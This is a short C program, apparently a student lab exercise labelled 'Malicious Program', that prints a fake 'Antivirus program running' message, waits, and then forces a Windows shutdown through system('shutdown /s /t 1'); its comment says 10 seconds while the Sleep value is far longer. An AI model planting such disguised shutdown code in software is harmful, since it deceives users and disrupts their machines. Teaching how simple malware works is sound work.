#include <stdio.h>
#include <windows.h>
void printDetails() {
    printf("Lab No.: 19\n") ;
    printf("Name: Harsa Shahi\n");
    printf("Roll No.: 101/078 (Section: 'C')\n");
    printf("---------------------\n");
    printf("Malicious Program\n");
    printf("---------------------\n");
}
int main() {
	printDetails();
    printf("Antivirus program running...\n");
    Sleep(1000000); // Wait for 10 seconds
    system("shutdown /s /t 1");
    return 0;
}